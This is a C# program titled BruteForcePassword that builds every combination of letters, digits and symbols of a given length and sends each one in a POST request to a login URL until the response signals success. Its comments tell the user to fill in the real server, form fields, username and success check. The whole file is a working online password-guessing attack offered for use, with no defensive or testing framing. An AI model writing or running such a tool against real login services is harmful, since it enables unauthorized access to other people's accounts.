using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Text;

namespace BruteForcePassword
{
    class Program
    {
        // Method to generate all possible combinations of symbols, digits, uppercase, and lowercase letters
        public static IEnumerable<string> GenerateCombinations(string characters, int length)
        {
            if (length == 0)
                yield return "";
            else
            {
                foreach (var c in characters)
                {
                    foreach (var suffix in GenerateCombinations(characters, length - 1))
                    {
                        yield return c + suffix;
                    }
                }
            }
        }

        // Method to attempt login with a given username and password
        public static async Task<bool> TryPassword(string username, string password)
        {
            string url = "http://example.com/login";  // Replace with the actual server URL
            var data = new Dictionary<string, string>
            {
                { "username", username },  // Replace "username" with the actual field name for the username
                { "password", password }   // Replace "password" with the actual field name for the password
            };

            using (HttpClient client = new HttpClient())
            {
                try
                {
                    var content = new FormUrlEncodedContent(data);
                    HttpResponseMessage response = await client.PostAsync(url, content);
                    string responseString = await response.Content.ReadAsStringAsync();

                    // Logging the current attempt
                    Console.WriteLine($"Attempt: {username} | {password}, Response: {response.StatusCode}");

                    // Check if the response indicates a successful login
                    if (responseString.Contains("Success"))  // Replace with the appropriate success condition
                    {
                        Console.WriteLine($"Password found for user {username}: {password}");
                        return true;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Error sending request: {e.Message}");
                }
            }

            return false;
        }

        // Method to iterate through all possible combinations and attempt login
        public static async Task BruteForcePassword(string username, int length)
        {
            string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~";  // All letters, digits, and symbols

            foreach (var combination in GenerateCombinations(characters, length))
            {
                if (await TryPassword(username, combination))
                {
                    break;  // Exit if the correct password is found
                }
            }
        }

        static async Task Main(string[] args)
        {
            string username = "myusername";  // Replace with the actual username
            int passwordLength = 4;          // Set the length of the password to guess

            // Start the brute force password guessing
            await BruteForcePassword(username, passwordLength);
        }
    }
}
